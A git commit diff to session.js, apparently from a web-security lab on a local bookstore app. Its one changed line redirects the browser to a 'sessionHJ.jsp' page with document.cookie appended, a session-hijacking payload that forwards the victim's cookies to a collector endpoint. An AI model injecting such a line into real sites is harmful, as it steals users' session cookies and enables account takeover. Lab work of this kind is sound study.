23128e9b6472c9648200a13238b47370d54ddd53
Prashanth <prashanths1992@gmail.com>
2018-03-04 19:04:26 -0500

    Update session.js

--- session.js
+++ session.js
@@ -1,1 +1,1 @@
-window.location.href = "http://localhost:8080/bookstore/sessionHJ.jsp?cookie="+encodeURI(document.cookie);
+window.location.href = "http://localhost:8080/bookstore/sessionHJ.jsp?"+encodeURI(document.cookie);
